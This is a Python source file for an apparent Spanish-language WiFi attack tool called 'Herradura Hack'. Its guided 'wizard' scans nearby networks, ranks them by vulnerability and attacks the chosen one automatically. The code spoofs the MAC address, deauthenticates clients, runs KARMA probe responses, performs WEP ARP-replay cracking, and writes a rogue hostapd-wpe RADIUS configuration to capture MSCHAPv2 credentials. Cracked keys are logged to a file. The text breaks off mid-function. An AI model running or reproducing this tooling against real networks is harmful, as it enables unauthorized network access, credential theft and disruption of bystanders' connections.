#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════╗
# ║   HERRADURA HACK v5.0                        ║
# ║   Herramienta avanzada de Pentesting WiFi    ║
# ║   Creador: Apo1o13                           ║
# ║   Uso exclusivo para pruebas autorizadas     ║
# ╚══════════════════════════════════════════════╝

TOOL_NAME    = "Herradura Hack"
TOOL_VERSION = "5.0"
TOOL_AUTHOR  = "Apo1o13"

import os
import sys
import time
import re
import csv
import json
import random
import threading
import subprocess
import urllib.request
import urllib.parse
import sqlite3
import datetime
import itertools
import string
import html as html_module
import socket
import ipaddress
from banner.banner import banner, menu, goodbye

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "herradura_history.db")
SESSION_START = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ─────────────────────────────────────────────────────────────────────────────
# Colores
# ─────────────────────────────────────────────────────────────────────────────
RED     = '\033[1;31m'
GREEN   = '\033[1;32m'
YELLOW  = '\033[1;33m'
CYAN    = '\033[1;36m'
WHITE   = '\033[1;37m'
BLUE    = '\033[1;34m'
MAGENTA = '\033[1;35m'
DIM     = '\033[2m'
END     = '\033[0m'

# ─────────────────────────────────────────────────────────────────────────────
# Mensajes de estado
# ─────────────────────────────────────────────────────────────────────────────
def info(msg):    print(f" {GREEN}[+]{END} {msg}")
def warn(msg):    print(f" {YELLOW}[!]{END} {msg}")
def error(msg):   print(f" {RED}[✗]{END} {msg}")
def step(n, msg): print(f"\n {CYAN}[Paso {n}]{END} {WHITE}{msg}{END}")
def tip(msg):     print(f" {DIM}  ↳ {msg}{END}")
def ask(msg):     return input(f" {GREEN}>>{END} {WHITE}{msg}{END}: ").strip()
def ok(msg):      print(f" {GREEN}[✔]{END} {GREEN}{msg}{END}")

def separador(titulo=""):
    if titulo:
        pad = (60 - len(titulo)) // 2
        print(f"\n {WHITE}{'─'*pad} {titulo} {'─'*pad}{END}")
    else:
        print(f" {WHITE}{'─'*62}{END}")

def pause_back():
    # Limpiar buffer de stdin para que no consuma \n residuales de preguntas anteriores
    try:
        import termios
        termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except Exception:
        pass
    input(f"\n {WHITE}[Presione Enter para volver al menú]{END}")

# ─────────────────────────────────────────────────────────────────────────────
# Spinner de progreso
# ─────────────────────────────────────────────────────────────────────────────
class Spinner:
    def __init__(self, msg="Procesando..."):
        self.msg = msg
        self._stop = threading.Event()
        self._t = threading.Thread(target=self._spin, daemon=True)

    def _spin(self):
        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        i = 0
        while not self._stop.is_set():
            sys.stdout.write(f"\r {CYAN}{chars[i % len(chars)]}{END} {self.msg}  ")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        sys.stdout.write(f"\r{' ' * (len(self.msg) + 10)}\r")
        sys.stdout.flush()

    def start(self): self._t.start()
    def stop(self):  self._stop.set(); self._t.join()

# ─────────────────────────────────────────────────────────────────────────────
# Resultados en vivo — lista compartida entre sesiones del Exploit Engine
# ─────────────────────────────────────────────────────────────────────────────
_LIVE_RESULTS: list = []   # [(essid, bssid, clave, metodo, hora)]

def _live_results_append(essid, bssid, clave, metodo):
    import datetime
    hora = datetime.datetime.now().strftime("%H:%M:%S")
    _LIVE_RESULTS.append((essid, bssid, clave, metodo, hora))
    os.makedirs("exploit-engine", exist_ok=True)
    with open("exploit-engine/resultados.txt", "a") as _f:
        _f.write(f"{hora} | {essid:<22} | {bssid} | {clave} | {metodo}\n")

# ─────────────────────────────────────────────────────────────────────────────
# ExploitEngine — Motor de explotación con % en tiempo real
# ─────────────────────────────────────────────────────────────────────────────
class ExploitEngine:
    """Motor de explotación con barra de progreso animada por fases."""

    BAR_LEN = 34

    def __init__(self, essid, bssid, channel, interfaz, wordlist=""):
        self.essid    = essid
        self.bssid    = bssid
        self.channel  = channel
        self.interfaz = interfaz
        self.wordlist = wordlist or "/usr/share/wordlists/rockyou.txt"
        self._phases: list = []   # [(name, weight)]
        self._cur     = 0
        self._phase_pct = 0       # 0-100 dentro de la fase actual
        self.overall  = 0         # 0-100 global
        self._lock    = threading.Lock()
        self._stop    = threading.Event()
        self._thread  = None
        self.result   = None      # clave encontrada o None
        self.method   = None      # método que funcionó

    # ── Gestión de fases ───────────────────────────────────────────────────────
    def add_phase(self, name: str, weight: int = 1):
        self._phases.append((name, weight))

    def set_phase(self, idx: int, pct: int = 0):
        with self._lock:
            self._cur       = idx
            self._phase_pct = pct
            self._recalc()

    def update_phase(self, pct: int):
        with self._lock:
            self._phase_pct = min(100, max(0, pct))
            self._recalc()

    def _recalc(self):
        if not self._phases: return
        total  = sum(w for _, w in self._phases)
        done   = sum(self._phases[i][1] for i in range(self._cur))
        cur_w  = self._phases[self._cur][1] if self._cur < len(self._phases) else 0
        self.overall = int((done + cur_w * self._phase_pct / 100) / total * 100)

    # ── Hilo de display ────────────────────────────────────────────────────────
    def _loop(self):
        frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        i = 0
        first = True
        while not self._stop.is_set():
            with self._lock:
                pct   = self.overall
                cidx  = self._cur
                cpct  = self._phase_pct
                pname = self._phases[cidx][0] if cidx < len(self._phases) else "Completado"
            filled = int(self.BAR_LEN * pct / 100)
            if pct < 25:      col = YELLOW
            elif pct < 60:    col = MAGENTA
            elif pct < 85:    col = RED
            else:             col = GREEN
            bar = col + "█" * filled + END + DIM + "░" * (self.BAR_LEN - filled) + END
            spin = f"{CYAN}{frames[i % len(frames)]}{END}"

            # Panel de resultados en vivo (últimas 3 claves encontradas)
            if _LIVE_RESULTS:
                res_lines = []
                for essid_r, _, clave_r, metodo_r, hora_r in _LIVE_RESULTS[-3:]:
                    res_lines.append(
                        f"  {GREEN}[✔]{END} {hora_r}  {WHITE}{essid_r[:22]:<22}{END}  "
                        f"{GREEN}{clave_r}{END}  {DIM}({metodo_r}){END}"
                    )
                panel = "\n".join(res_lines)
                n_lines = len(res_lines) + 1  # +1 para la barra
            else:
                panel = f"  {DIM}── Sin resultados aún ──{END}"
                n_lines = 2

            if not first:
                sys.stdout.write(f"\033[{n_lines}A")  # subir N líneas

            sys.stdout.write(panel + "\n")
            sys.stdout.write(
                f"  {spin} {WHITE}[EXPLOIT ENGINE]{END} "
                f"[{bar}] {col}{pct:>3}%{END}  "
                f"{DIM}{pname[:28]}… {cpct}%{END}   \n"
            )
            sys.stdout.flush()
            i += 1
            first = False
            time.sleep(0.12)
        sys.stdout.write(f"\033[{n_lines}A" + ("\n" + " " * 90) * n_lines + "\r")
        sys.stdout.flush()

    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread: self._thread.join(timeout=2)

    def done(self, result=None, method=None):
        """Llama al finalizar — marca 100% y detiene display."""
        with self._lock:
            self.overall    = 100
            self._phase_pct = 100
        if result:
            _live_results_append(self.essid, self.bssid, result, method or "desconocido")
        time.sleep(0.3)
        self.stop()
        self.result = result
        self.method = method

# ─────────────────────────────────────────────────────────────────────────────
# Barra de progreso simple
# ─────────────────────────────────────────────────────────────────────────────
def progress_bar(segundos, msg="Capturando"):
    for i in range(segundos):
        pct = int((i + 1) / segundos * 40)
        bar = GREEN + "█" * pct + END + DIM + "░" * (40 - pct) + END
        elapsed = f"{i+1}/{segundos}s"
        sys.stdout.write(f"\r {CYAN}[{END}{bar}{CYAN}]{END} {WHITE}{elapsed}{END} {msg}  ")
        sys.stdout.flush()
        time.sleep(1)
    print()

# ─────────────────────────────────────────────────────────────────────────────
# Helpers de sistema
# ─────────────────────────────────────────────────────────────────────────────
def run(cmd, capture=False):
    import re as _re
    # Si el comando usa "timeout N airodump-ng", forzar kill-after para evitar cuelgues
    cmd = _re.sub(
        r'\btimeout\s+(\d+)\s+(airodump-ng)',
        r'timeout --kill-after=5 \1 \2',
        cmd
    )
    try:
        if capture:
            # Extraer segundos del timeout para poner safety net en subprocess
            m = _re.search(r'timeout\s+(?:--kill-after=\d+\s+)?(\d+)', cmd)
            py_timeout = int(m.group(1)) + 15 if m else None
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=py_timeout)
            return r.stdout + r.stderr
        else:
            subprocess.run(cmd, shell=True)
    except (KeyboardInterrupt, subprocess.TimeoutExpired):
        pass

def check_tool(tool):
    r = run(f"which {tool} 2>/dev/null", capture=True)
    return bool(r and r.strip())

def validate_bssid(b):
    return bool(re.match(r'^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$', b))

def validate_channel(ch):
    try:
        return 1 <= int(ch) <= 177
    except ValueError:
        return False

def get_interfaces():
    out = run("iw dev 2>/dev/null | grep Interface", capture=True) or ""
    return re.findall(r'Interface\s+(\S+)', out)

# ─────────────────────────────────────────────────────────────────────────────
# Selección inteligente de interfaz
# ─────────────────────────────────────────────────────────────────────────────
def select_interface(monitor_only=False, auto=False):
    ifaces = get_interfaces()
    if not ifaces:
        warn("No se detectaron interfaces inalámbricas.")
        tip("Conecte un adaptador WiFi compatible (ej. Alfa AWUS036ACH).")
        return ask("Ingrese el nombre manualmente (ej: wlan0)")

    # Si solo hay una, seleccionarla automáticamente siempre
    if len(ifaces) == 1:
        ok(f"Interfaz detectada automáticamente: {WHITE}{ifaces[0]}{END}")
        return ifaces[0]

    separador("INTERFACES DISPONIBLES")
    for i, iface in enumerate(ifaces, 1):
        mode_info = run(f"iw dev {iface} info 2>/dev/null | grep type", capture=True) or ""
        mode = "monitor" if "monitor" in mode_info else "managed"
        color = GREEN if mode == "monitor" else YELLOW
        print(f"  {WHITE}[{i}]{END} {iface}  {color}({mode}){END}")

    print()
    sel = ask("Seleccione número de interfaz")
    if sel.isdigit() and 1 <= int(sel) <= len(ifaces):
        return ifaces[int(sel) - 1]
    return sel

# ─────────────────────────────────────────────────────────────────────────────
# Escaneo de redes con tabla visual
# ─────────────────────────────────────────────────────────────────────────────
def quick_scan(interfaz, segundos=15):
    """Escanea redes y devuelve lista de diccionarios."""
    os.makedirs("scan-output", exist_ok=True)
    out_base = "scan-output/_tmp_scan"

    # Limpiar archivos anteriores
    run(f"rm -f {out_base}-01.csv 2>/dev/null")

    sp = Spinner(f"Escaneando redes durante {segundos} segundos...")
    sp.start()
    try:
        subprocess.run(
            f"timeout --kill-after=5 {segundos} airodump-ng --write {out_base} --output-format csv {interfaz}",
            shell=True, capture_output=True,
            timeout=segundos + 10
        )
    except Exception:
        pass
    sp.stop()

    redes = []
    csv_file = f"{out_base}-01.csv"
    if not os.path.exists(csv_file):
        return redes

    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                if not validate_bssid(bssid):
                    continue
                channel  = row[3].strip()
                speed    = row[4].strip()
                privacy  = row[5].strip()
                cipher   = row[6].strip()
                auth     = row[7].strip()
                power    = row[8].strip()
                beacons  = row[9].strip()
                essid    = row[13].strip() if len(row) > 13 else "<oculto>"
                if not essid:
                    essid = "<oculto>"
                redes.append({
                    "bssid": bssid, "channel": channel, "speed": speed,
                    "privacy": privacy, "cipher": cipher, "auth": auth,
                    "power": power, "beacons": beacons, "essid": essid,
                })
    except Exception:
        pass

    # Eliminar duplicados por BSSID
    seen = set()
    unique = []
    for r in redes:
        if r["bssid"] not in seen:
            seen.add(r["bssid"])
            unique.append(r)
    return unique

def print_network_table(redes):
    """Imprime tabla visual de redes."""
    if not redes:
        warn("No se encontraron redes.")
        return

    separador("REDES DETECTADAS")
    print(f"  {WHITE}{'#':<4} {'ESSID':<28} {'BSSID':<19} {'CH':<5} {'SEÑAL':<8} {'SEGURIDAD':<20}{END}")
    separador()

    for i, r in enumerate(redes, 1):
        # Color según señal
        try:
            pwr = int(r["power"])
            if pwr >= -50:
                sig_color = GREEN
                sig_label = "Excelente"
            elif pwr >= -65:
                sig_color = YELLOW
                sig_label = "Buena    "
            elif pwr >= -80:
                sig_color = MAGENTA
                sig_label = "Regular  "
            else:
                sig_color = RED
                sig_label = "Débil    "
        except Exception:
            sig_color = DIM
            sig_label = "N/A      "

        # Color según seguridad
        priv = r["privacy"].upper()
        if "WPA3" in priv:
            sec_color = CYAN
            sec_icon  = "🔒 WPA3"
        elif "WPA2" in priv:
            sec_color = GREEN
            sec_icon  = "🔒 WPA2"
        elif "WPA" in priv:
            sec_color = YELLOW
            sec_icon  = "⚠  WPA"
        elif "WEP" in priv:
            sec_color = RED
            sec_icon  = "🔓 WEP (vulnerable)"
        elif "OPN" in priv or not priv:
            sec_color = RED
            sec_icon  = "🔓 ABIERTA"
        else:
            sec_color = WHITE
            sec_icon  = priv

        essid_show = r["essid"][:26] if len(r["essid"]) > 26 else r["essid"]
        print(
            f"  {WHITE}[{i:>2}]{END} "
            f"{CYAN}{essid_show:<28}{END} "
            f"{DIM}{r['bssid']:<19}{END} "
            f"{WHITE}{r['channel']:<5}{END} "
            f"{sig_color}{sig_label:<8}{END} "
            f"{sec_color}{sec_icon}{END}"
        )

    separador()
    print(f"  {DIM}Total: {len(redes)} redes detectadas{END}\n")

def select_target_from_scan(interfaz, prompt="Seleccione red objetivo"):
    """Escanea y permite elegir red de la lista visual."""
    separador("ESCANEO DE REDES")
    info("Iniciando escaneo para detectar redes cercanas...")
    tip("Cuanto más tiempo, más redes se detectan.")

    t = ask("Tiempo de escaneo en segundos (recomendado 15, máximo 60)")
    try:
        t = max(5, min(int(t), 60))
    except ValueError:
        t = 15

    redes = quick_scan(interfaz, t)
    if not redes:
        warn("No se encontraron redes. Asegúrese de estar en modo monitor.")
        return None, None, None

    print_network_table(redes)

    sel = ask(f"{prompt} [número]")
    if not sel.isdigit() or not (1 <= int(sel) <= len(redes)):
        error("Selección inválida.")
        return None, None, None

    red = redes[int(sel) - 1]
    info(f"Objetivo seleccionado: {CYAN}{red['essid']}{END}  {DIM}({red['bssid']}  CH:{red['channel']}){END}")
    return red["bssid"], red["channel"], red["essid"]

def verify_handshake(cap_file):
    if not os.path.exists(cap_file):
        cap_file = cap_file + "-01.cap"
    if not os.path.exists(cap_file):
        return False, cap_file
    r = run(f"aircrack-ng {cap_file} 2>&1", capture=True)
    if r and "handshake" in r.lower():
        return True, cap_file
    # Verificación alternativa con hcxpcapngtool si aircrack-ng no detecta handshake
    if os.path.exists(cap_file) and check_tool("hcxpcapngtool"):
        _hc_test = run(f"hcxpcapngtool -o /tmp/_hs_test.hc22000 {cap_file} 2>&1", capture=True) or ""
        if os.path.exists("/tmp/_hs_test.hc22000") and os.path.getsize("/tmp/_hs_test.hc22000") > 0:
            run("rm -f /tmp/_hs_test.hc22000")
            return True, cap_file
    return False, cap_file

# ─────────────────────────────────────────────────────────────────────────────
# Diccionarios: auto-localizar o descargar
# ─────────────────────────────────────────────────────────────────────────────
WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt.gz",
    "/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
    "/usr/share/wordlists/fasttrack.txt",
]

def find_wordlist():
    """Busca un diccionario disponible automáticamente."""
    for w in WORDLISTS:
        if os.path.exists(w):
            return w
    return None

def select_wordlist():
    """Guía al usuario para seleccionar o proveer un diccionario."""
    found = find_wordlist()

    separador("DICCIONARIO DE CONTRASEÑAS")
    print(f"  {DIM}Un diccionario es un archivo con contraseñas comunes.")
    print(f"  Cuanto más grande y específico, más probabilidad de éxito.{END}\n")

    if found:
        ok(f"Diccionario encontrado automáticamente:")
        print(f"   {CYAN}{found}{END}\n")
        usar = ask("¿Usar este? (Enter=sí / escriba ruta alternativa)")
        return usar if usar and os.path.exists(usar) else found
    else:
        warn("No se encontró rockyou.txt. Opciones:")
        print(f"  {WHITE}[1]{END} Instalar wordlists: {CYAN}sudo apt install wordlists{END}")
        print(f"  {WHITE}[2]{END} Ingresar ruta manual de un diccionario\n")
        ruta = ask("Ruta del diccionario")
        if os.path.exists(ruta):
            return ruta
        error("Diccionario no encontrado.")
        return None

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#   MODO WIZARD — GUÍA PASO A PASO PARA PRINCIPIANTES
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

def modo_wizard():
    """
    [W] Modo Guiado COMPLETO — Todos los ataques en un solo flujo automático:
    MAC Spoof → Monitor → Probe Harvest → Scan → Score → Objetivo
    → KARMA en background → Detección de tipo de red → Ataque apropiado:
        WEP: ARP replay + crack
        OPEN: reportar
        Enterprise: RADIUS falso + EAP bypass
        WPA3 puro: Dragonblood downgrade
        WPA/WPA2: Evil Twin + Exploit Engine (10 fases) + Kr00k
    → Post-explotación → Reporte HTML
    """
    import threading as _thr

    os.system("clear")
    banner()
    separador("MODO GUIADO — ARSENAL COMPLETO AUTOMATICO")
    print(f"""
  {WHITE}Flujo totalmente automático con TODOS los ataques:{END}
  {GREEN}[Paso 1]{END} Detecta el adaptador WiFi automáticamente
  {GREEN}[Paso 2]{END} Falsifica tu MAC (stealth opcional)
  {GREEN}[Paso 3]{END} Activa modo monitor
  {GREEN}[Paso 4]{END} Captura Probe Requests de dispositivos cercanos
  {GREEN}[Paso 5]{END} Escanea redes y las puntúa por vulnerabilidad
  {GREEN}[Paso 6]{END} Tú eliges el objetivo (o auto-selecciona el más vulnerable)
  {GREEN}[Paso 7]{END} Si el SSID está oculto, lo revela automáticamente
  {GREEN}[Paso 8]{END} KARMA en background + ataque correcto según tipo de red:
          {DIM}WEP → crack automático  |  OPEN → acceso directo
          Enterprise → RADIUS falso  |  WPA3 → Dragonblood
          WPA/WPA2 → Evil Twin + Exploit Engine 10 fases + Kr00k{END}
  {GREEN}  +  {END} Post-explotación y reporte HTML al finalizar
    """)

    continuar = ask("¿Continuar? (s/n)")
    if continuar.lower() != 's':
        return

    # ── PASO 1: Detectar interfaz ─────────────────────────────────────────────
    step(1, "Detectando adaptador WiFi")
    interfaz = select_interface()
    if not interfaz:
        error("No se detectó ninguna interfaz. Conecta tu adaptador WiFi.")
        pause_back(); return

    # ── PASO 2: MAC Spoof (stealth) ───────────────────────────────────────────
    step(2, "Anonimato — Falsificación de MAC")
    tip("Cambiar la MAC oculta tu identidad real durante el ataque.")
    do_spoof = ask("¿Falsificar MAC antes de atacar? (s/n)")
    if do_spoof.lower() == 's':
        octetos = [random.randint(0, 255) for _ in range(6)]
        octetos[0] = octetos[0] & 0xFE   # bit unicast
        mac_nueva = ':'.join(f'{o:02X}' for o in octetos)
        run(f"ip link set {interfaz} down 2>/dev/null")
        run(f"ip link set {interfaz} address {mac_nueva} 2>/dev/null")
        run(f"ip link set {interfaz} up 2>/dev/null")
        ok(f"MAC cambiada a: {CYAN}{mac_nueva}{END}")
    else:
        info("MAC original mantenida.")

    # ── PASO 3: Activar monitor ───────────────────────────────────────────────
    step(3, "Activando modo monitor")
    tip("Compatible con TP-Link, Alfa, Ralink, Realtek, Atheros...")
    sp = Spinner("Activando modo monitor...")
    sp.start()
    mon_iface = _enable_monitor(interfaz)
    sp.stop()

    mode_check = run(f"iw dev {mon_iface} info 2>/dev/null | grep type", capture=True) or ""
    if "monitor" not in mode_check:
        error(f"No se pudo activar modo monitor en {mon_iface}.")
        tip("Prueba: sudo modprobe -r rtl8812au && sudo modprobe rtl8812au")
        tip("O instala el driver: sudo apt install realtek-rtl88xxau-dkms")
        pause_back(); return

    ok(f"Modo monitor activo: {CYAN}{mon_iface}{END}")

    # ── PASO 4: Probe Request Harvesting ─────────────────────────────────────
    step(4, "Capturando Probe Requests de dispositivos cercanos")
    tip("Los dispositivos buscan redes conocidas — los detectamos para recon.")
    _probes_encontrados: dict = {}
    if check_tool("tshark"):
        sp_pr = Spinner("Capturando probes (15s)...")
        sp_pr.start()
        pr_out = run(
            f"timeout 15 tshark -i {mon_iface} -Y 'wlan.fc.type_subtype==0x04' "
            f"-T fields -e wlan.sa -e wlan.ssid 2>/dev/null",
            capture=True
        ) or ""
        sp_pr.stop()
        for _line in pr_out.strip().splitlines():
            _parts = _line.strip().split("\t")
            if len(_parts) >= 2:
                _mac, _ssid = _parts[0].strip(), _parts[1].strip()
                if validate_bssid(_mac) and _ssid:
                    _probes_encontrados.setdefault(_mac, set()).add(_ssid)
        if _probes_encontrados:
            ok(f"Probe Harvest: {len(_probes_encontrados)} dispositivos detectados "
               f"buscando {sum(len(v) for v in _probes_encontrados.values())} redes.")
        else:
            info("Sin probes detectados. Continuando.")
    else:
        info("tshark no disponible — omitiendo Probe Harvest.")

    # ── PASO 5: Escanear + WPS + Puntuar ────────────────────────────────────
    step(5, "Escaneando redes y analizando vulnerabilidades")
    redes = quick_scan(mon_iface, 20)
    if not redes:
        error("No se detectaron redes. ¿El adaptador está en modo monitor?")
        run(f"airmon-ng stop {mon_iface} 2>/dev/null")
        run("systemctl start NetworkManager 2>/dev/null")
        pause_back(); return

    wps_raw = ""
    if check_tool("wash"):
        sp2 = Spinner("Verificando WPS en redes encontradas...")
        sp2.start()
        try:
            wps_raw = subprocess.run(
                f"timeout 10 wash -i {mon_iface} 2>/dev/null",
                shell=True, capture_output=True, text=True).stdout
        except Exception: pass
        sp2.stop()

    scored = []
    for r in redes:
        sc, vv = _score_network(r, [wps_raw])
        scored.append((sc, vv, r))
    scored.sort(key=lambda x: x[0], reverse=True)

    separador("REDES DETECTADAS — ORDENADAS POR VULNERABILIDAD")
    print(f"  {WHITE}{'#':<4} {'ESSID':<24} {'SEGURIDAD':<12} {'SCORE':<7} {'VECTOR'}{END}")
    separador()
    for i, (sc, vv, r) in enumerate(scored, 1):
        col = RED if sc >= 80 else YELLOW if sc >= 50 else GREEN
        # Marcar redes buscadas por probes
        _probe_mark = f" {CYAN}[buscada]{END}" if any(
            r['essid'] in ssids for ssids in _probes_encontrados.values()
        ) else ""
        print(f"  {WHITE}[{i:>2}]{END} {CYAN}{r['essid'][:22]:<24}{END} "
              f"{YELLOW}{r['privacy'][:10]:<12}{END} "
              f"{col}{sc:<7}{END} {DIM}{','.join(vv[:2])}{END}{_probe_mark}")
    separador()

    # ── PASO 6: Elegir objetivo ───────────────────────────────────────────────
    step(6, "Selección de objetivo")
    print(f"  {DIM}Enter = atacar la más vulnerable ([1]).  Las marcadas {CYAN}[buscada]{END}{DIM} tienen dispositivos que las necesitan.{END}")
    sel = ask("Número de red objetivo (Enter = más vulnerable)")
    if sel == "" or not sel.isdigit():
        idx = 0
    else:
        idx = max(0, min(int(sel) - 1, len(scored) - 1))

    sc_t, vv_t, red_t = scored[idx]
    bssid   = red_t["bssid"]
    channel = red_t["channel"]
    essid   = red_t["essid"]
    priv    = red_t["privacy"].upper()

    separador(f"OBJETIVO: {essid}")
    info(f"BSSID: {bssid}  Canal: {channel}  Score: {sc_t}  Privacidad: {priv}")
    info(f"Vectores: {', '.join(vv_t)}")

    # Wordlist
    wordlist = select_wordlist() or "/usr/share/wordlists/rockyou.txt"

    clave  = None
    metodo = None

    # ─────────────────────────────────────────────────────────────────────────
    # ── KARMA en background sobre el resto de redes ────────────────────────
    # ─────────────────────────────────────────────────────────────────────────
    _karma_stop  = _thr.Event()
    _karma_procs = []

    def _karma_background():
        """KARMA simplificado: mdk4 probe-response para atrapar otros clientes."""
        if not check_tool("mdk4"):
            return
        try:
            p = subprocess.Popen(
                f"mdk4 {mon_iface} p 2>/dev/null",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            _karma_procs.append(p)
            _karma_stop.wait()
            p.terminate()
        except Exception:
            pass

    _karma_t = _thr.Thread(target=_karma_background, daemon=True)
    _karma_t.start()
    if check_tool("mdk4"):
        ok(f"KARMA activo en background — capturando otras redes en el canal {channel}")

    # ─────────────────────────────────────────────────────────────────────────
    # ── Detectar si el SSID es oculto ─────────────────────────────────────
    # ─────────────────────────────────────────────────────────────────────────
    if not essid or essid in ("<oculto>", "<length: 0>", "") or essid.startswith("<length"):
        step(7, "SSID oculto detectado — intentando revelarlo")
        info("Enviando deauths para forzar reconexión de clientes...")
        os.makedirs("handshakes", exist_ok=True)
        _hidden_base = f"handshakes/hidden_{bssid.replace(':','')}"
        _cap_proc_h = subprocess.Popen(
            f"airodump-ng -c {channel} --bssid {bssid} -w {_hidden_base} {mon_iface}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        for _rnd in range(3):
            run(f"aireplay-ng -0 8 -a {bssid} {mon_iface} 2>/dev/null", capture=True)
            time.sleep(3)
        _cap_proc_h.terminate()
        # Intentar extraer SSID
        _cap_h = _hidden_base + "-01.cap"
        if os.path.exists(_cap_h) and check_tool("tshark"):
            _ssid_raw = run(
                f"tshark -r {_cap_h} -Y 'wlan.bssid=={bssid} && wlan.ssid' "
                f"-T fields -e wlan.ssid 2>/dev/null | sort -u | head -3",
                capture=True
            ) or ""
            _ssids_found = [s.strip() for s in _ssid_raw.splitlines() if s.strip() and s.strip() != "0"]
            if _ssids_found:
                essid = _ssids_found[0]
                ok(f"SSID revelado: {GREEN}{essid}{END}")
            else:
                essid = f"oculto_{bssid.replace(':','')[-6:]}"
                warn(f"No se pudo revelar el SSID. Usando: {essid}")
        else:
            essid = f"oculto_{bssid.replace(':','')[-6:]}"

    step_n = 8

    # ─────────────────────────────────────────────────────────────────────────
    # ── RAMA: RED ABIERTA ─────────────────────────────────────────────────
    # ─────────────────────────────────────────────────────────────────────────
    if "OPN" in priv or not priv:
        step(step_n, "Red ABIERTA detectada — sin contraseña necesaria")
        ok(f"La red '{essid}' no tiene contraseña (red abierta).")
        info("Conéctese directamente y use [28] Post-Explotación para analizar la red.")
        clave  = "SIN CONTRASEÑA"
        metodo = "Red Abierta"
        db_log_attack("Wizard OPEN", essid, bssid, channel, "abierta")

    # ─────────────────────────────────────────────────────────────────────────
    # ── RAMA: WEP ────────────────────────────────────────────────────────
    # ─────────────────────────────────────────────────────────────────────────
    elif "WEP" in priv:
        step(step_n, "WEP detectado — ataque automático ARP replay + crack")
        info("WEP es trivialmente vulnerable. Iniciando ataque...")
        os.makedirs("handshakes", exist_ok=True)
        essid_s_wep = re.sub(r'[^\w\-]', '_', essid)
        _wep_base = f"handshakes/wiz_wep_{essid_s_wep}"

        # Fake auth
        run(f"aireplay-ng -1 0 -a {bssid} -e {essid} {mon_iface} 2>/dev/null", capture=True)

        # Captura en background
        _wep_cap = subprocess.Popen(
            f"airodump-ng -c {channel} --bssid {bssid} -w {_wep_base} {mon_iface}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(3)

        sp_wep = Spinner("ARP replay — acumulando IVs (90s máx)...")
        sp_wep.start()
        try:
            subprocess.run(
                f"aireplay-ng -3 -b {bssid} -h {mon_iface} {mon_iface}",
                shell=True, timeout=90, capture_output=True
            )
        except Exception:
            pass
        sp_wep.stop()
        _wep_cap.terminate()
        time.sleep(2)

        _wep_cap_file = _wep_base + "-01.cap"
        if os.path.exists(_wep_cap_file):
            sp_wc = Spinner("Crackeando WEP con aircrack-ng...")
            sp_wc.start()
            _wep_res = run(f"aircrack-ng {_wep_cap_file} 2>/dev/null", capture=True) or ""
            sp_wc.stop()
            _wep_key = None
            for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
                _wm = re.search(_pat, _wep_res, re.IGNORECASE)
                if _wm:
                    _wep_key = _wm.group(1).strip()
                    break
            clave = _wep_key or "encontrada (ver salida)"
            if _wep_key:
                metodo = "WEP ARP-replay + aircrack"
                ok(f"WEP CRACKEADA: {GREEN}{clave}{END}")
            else:
                warn("IVs insuficientes. Se necesitan más paquetes (100.000+ IVs).")
        else:
            warn("No se generó captura WEP.")

    # ─────────────────────────────────────────────────────────────────────────
    # ── RAMA: WPA ENTERPRISE (802.1X/EAP) ────────────────────────────────
    # ─────────────────────────────────────────────────────────────────────────
    elif "MGT" in priv or "EAP" in priv or "ENTERPRISE" in essid.upper() or \
         "CORP" in essid.upper() or "EDUROAM" in essid.upper():
        step(step_n, "WPA Enterprise detectado — servidor RADIUS falso")
        info("Levantando AP falso con EAP para capturar credenciales MSCHAPv2...")
        tip("Los clientes sin 'ca_cert' configurado se conectarán y enviarán sus hashes.")

        os.makedirs("/tmp/herradura_wiz_wpe", exist_ok=True)
        _wpe_log   = "/tmp/herradura_wiz_wpe/wpe.log"
        _wpe_creds = "/tmp/herradura_wiz_wpe/creds.txt"

        _wpe_tool = "hostapd-wpe" if check_tool("hostapd-wpe") else \
                    "hostapd"     if check_tool("hostapd")     else None
        if not _wpe_tool:
            warn("hostapd no disponible. Omitiendo Enterprise attack.")
        else:
            _wpe_conf = "/tmp/herradura_wiz_wpe/hostapd.conf"
            with open(_wpe_conf, "w") as _f:
                _f.write(f"interface={mon_iface}\ndriver=nl80211\nssid={essid}\n"
                         f"hw_mode=g\nchannel={channel}\nieee8021x=1\neap_server=1\n"
                         f"eap_user_file=/tmp/herradura_wiz_wpe/eap_users\n"
                         f"ca_cert=/etc/hostapd-wpe/certs/ca.pem\n"
                         f"server_cert=/etc/hostapd-wpe/certs/server.pem\n"
                         f"private_key=/etc/hostapd-wpe/certs/server.key\n"
                         f"private_key_passwd=whatever\ndh_file=/etc/hostapd-wpe/certs/dh\n"
                         f"wpe_logfile={_wpe_log}\n")
            with open("/tmp/herradura_wiz_wpe/eap_users", "w") as _f:
